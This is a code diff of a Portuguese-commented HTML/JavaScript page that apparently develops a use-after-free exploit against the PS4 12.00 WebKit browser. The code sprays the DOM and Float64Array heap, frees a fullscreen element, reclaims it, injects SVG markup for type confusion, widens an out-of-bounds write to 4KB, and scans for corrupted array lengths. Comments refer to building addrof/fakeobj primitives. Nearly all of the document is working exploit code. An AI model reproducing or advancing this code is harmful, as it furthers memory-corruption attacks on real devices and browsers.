@@ -1,13 +1,12 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF JSC Interleaved Feng Shui</title>
+<title>PS4 12.00 - UAF Long Range Probe</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Type Confusion → Interleaved Heap Scan</h2>
+<h2>UAF → Long Range Overwrite → JSC Scan</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -21,8 +20,7 @@ function log(msg){
 }
 
 // ==========================
-// 🌍 HEAP FENG SHUI INTERCALADO (O SEGREDO)
-// Unimos o DOM Spray e o Heap Spray no mesmo loop para forçar a colisão
+// 🌍 HEAP FENG SHUI INTERCALADO (MANTIDO)
 function setupInterleavedFengShui(){
     log("[*] Iniciando Interleaved Heap Spray...");
 
@@ -31,8 +29,6 @@ function setupInterleavedFengShui(){
     window.obj_spray = [];
 
     for(let i=0; i<6000; i++){
-        
-        // 1. Alocação na WebCore (DOM)
         let t = document.createTextNode("TXT_" + i);
         document.body.appendChild(t);
         window.dom_spray.push(t);
@@ -42,45 +38,38 @@ function setupInterleavedFengShui(){
         document.body.appendChild(d1);
         window.dom_spray.push(d1);
 
-        let d2 = document.createElement("div");
-        d2.setAttribute("data-x", "ATTR_" + i);
-        document.body.appendChild(d2);
-        window.dom_spray.push(d2);
-
-        // 2. Alocação no JSCore (FloatArray + Objects) COLADOS no DOM
         if(i < 5000){
             let f = new Float64Array(8);
-            f[0] = i; // Nossa isca
+            f[0] = i; 
             window.heap_spray.push(f);
-
-            // Preparando o par para o futuro addrof/fakeobj
             window.obj_spray.push({ pwn_id: i, pwn_val: 0x1337 });
         }
     }
+    log("[*] Spray concluído!");
+}
 
-    log("[*] Spray Intercalado concluído!");
-    log("[*] DOM: " + window.dom_spray.length + " | Float: " + window.heap_spray.length);
+// ==========================
+// HEAP SETUP (100% INALTERADO)
+function setupHeap(){
+    let arr=[];
+    for(let i=0; i<5000; i++){
+        let a=new Float64Array(8);
+        a[0]=i;
+        arr.push(a);
+    }
+    return arr;
 }
 
 // ==========================
 // FULLSCREEN (100% INALTERADO)
 function setupFullscreen(){
     let fsTarget=document.createElement("div");
-
     fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
-
     Object.assign(fsTarget.style,{
-        background:"black",
-        width:"100%",
-        height:"100%",
-        position:"absolute",
-        top:"0",
-        left:"0"
+        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
     });
-
     document.body.appendChild(fsTarget);
     fsTarget.webkitRequestFullscreen?.();
-
     return fsTarget;
 }
 
@@ -88,13 +77,11 @@ function setupFullscreen(){
 // 💣 RECLAIM (100% INALTERADO)
 function reclaim(size){
     log("[*] Reclaim size = " + size);
-
     for(let i=0;i<3000;i++){
         let e=document.createElement("div");
         document.body.appendChild(e);
         e.remove();
     }
-
     for(let i=0;i<size;i++){
         let e=document.createElement("div");
         e.innerHTML="<h1>CONTROL_"+i+"</h1>";
@@ -103,15 +90,13 @@ function reclaim(size){
 }
 
 // ==========================
-// 💥 SVG CONFUSION (100% INALTERADO)
+// 💥 SVG CONFUSION (MANTIDO)
 function inject(child){
     try{
         child.outerHTML = `
         <svg>
             <foreignObject width="100%" height="100%">
-                <div xmlns="http://www.w3.org/1999/xhtml">
-                    AAAA
-                </div>
+                <div xmlns="http://www.w3.org/1999/xhtml">AAAA</div>
             </foreignObject>
         </svg>`;
         log("[*] payload injected");
@@ -121,71 +106,61 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 OVERLAP PROBE (SCANNER ATUALIZADO)
+// 🔬 LONG RANGE PROBE
 function domOverlapProbe(fsTarget){
-    log("---- OVERLAP PROBE ----");
+    log("---- LONG RANGE PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
-
-        if(!n){
-            log("[!] no node");
-            return;
-        }
+        if(!n) return;
 
         if(n.nodeType === 3){
             log("[!!!] TEXTNODE CONFUSION");
 
-            // 💣 WRITE PRIMITIVA (Mantida para varrer a memória adjacente)
+            // 🚀 AUMENTAMOS O TIRO: 0x200 -> 0x1000 (4KB)
             try{
-                n.data = "A".repeat(0x200);
-                log("[PWN] write expand OK");
+                n.data = "A".repeat(0x1000); 
+                log("[PWN] Long range write OK");
             }catch(e){
                 log("[UAF] write crash");
             }
 
             // ==========================
-            // 🔥 SCAN DUPLO: DOM e JSC HEAP
+            // 🔥 SCANNER
             try{
-                // 1. SCAN DO DOM
+                // 1. Scan DOM
                 for(let i=0;i<window.dom_spray.length;i++){
                     let obj = window.dom_spray[i];
                     if(obj.nodeType === 3 && (!obj.data || !obj.data.includes("TXT_"))){
-                        log("[!!!] TEXTNODE CORROMPIDO @ " + i);
-                        return;
-                    }
-                    if(obj.nodeType === 1 && obj.innerHTML && obj.innerHTML.includes("AAAA")){
-                        log("[!!!] ELEMENT OVERLAP @ " + i);
+                        log("[!!!] DOM CORRUPT @ " + i);
                         return;
                     }
                 }
-                log("[SCAN] nenhum overlap no DOM");
 
-                // 2. SCAN DO FLOAT64ARRAY (JSC)
+                // 2. Scan JSC Heap
                 for(let i=0; i<window.heap_spray.length; i++){
-                    // Proteção extra: verifica se o tamanho do array foi corrompido primeiro (evita crash imediato)
-                    if(window.heap_spray[i].length !== 8){
-                        log("[$$$] JACKPOT! Float64Array LENGTH corrompido @ " + i);
+                    // Checamos se o valor mudou (Jackpot de Valor)
+                    if(window.heap_spray[i][0] !== i){
+                        log("[$$$] JACKPOT! VALOR CORROMPIDO @ " + i);
+                        log("[$$$] Novo valor: " + window.heap_spray[i][0]);
                         return;
                     }
-                    // Verifica se o valor "i" inicial foi sobrescrito pelos "A"s
-                    if(window.heap_spray[i][0] !== i){
-                        log("[$$$] JACKPOT! Float64Array VALOR corrompido @ " + i);
+                    // Checamos se o length mudou (Jackpot de Primitiva)
+                    if(window.heap_spray[i].length !== 8){
+                        log("[$$$] JACKPOT! LENGTH CORROMPIDO @ " + i);
+                        log("[$$$] Novo length: " + window.heap_spray[i].length);
                         return;
                     }
                 }
-                log("[SCAN] Float64Array intacto");
+                log("[SCAN] Tudo intacto (Tentando aumentar alcance...)");
 
             }catch(e){
                 log("[UAF] scan crash");
             }
 
-        } else {
-            log("[INFO] nao virou TextNode");
         }
-
     }catch(e){
-        log("[UAF] probe crash geral");
+        log("[UAF] probe crash");
     }
 }
 
@@ -193,20 +168,12 @@ function domOverlapProbe(fsTarget){
 // TRIGGER (100% INALTERADO)
 function trigger(fsTarget){
     log("[*] Trigger");
-
     try{
         fsTarget.remove();
-
-        if(document.webkitIsFullScreen || document.fullscreenElement){
-            document.webkitExitFullscreen?.();
-        }
-
-    }catch(e){
-        log("[ERRO]");
-    }
+        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
+    }catch(e){}
 
     let sizes=[1500,2000,2500,3000];
-
     sizes.forEach((s,i)=>{
         setTimeout(()=>reclaim(s), i*50);
     });
@@ -218,28 +185,21 @@ function trigger(fsTarget){
         }catch(e){}
     }, 30);
 
+    // Três tentativas com intervalos para capturar a realocação
     setTimeout(()=>domOverlapProbe(fsTarget), 80);
-    setTimeout(()=>domOverlapProbe(fsTarget), 160);
-    setTimeout(()=>domOverlapProbe(fsTarget), 240);
+    setTimeout(()=>domOverlapProbe(fsTarget), 180);
+    setTimeout(()=>domOverlapProbe(fsTarget), 280);
 
-    setTimeout(()=>{
-        alert(logBuffer.join("\n"));
-    }, 400);
-
-    // ⚠️ CRÍTICO
-    setTimeout(()=>location.reload(), 500);
+    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
+    setTimeout(()=>location.reload(), 600);
 }
 
 // ==========================
-// MAIN (AJUSTADO PARA O NOVO FENG SHUI)
+// MAIN
 function runTest(){
-    log("[*] Iniciando teste");
-
-    // Executa a nova alocação intercalada
+    log("[*] Iniciando teste...");
     setupInterleavedFengShui(); 
-
     let fsTarget=setupFullscreen();
-
     window.onblur=function(){
         log("[*] onblur");
         setTimeout(()=>trigger(fsTarget), 3000);
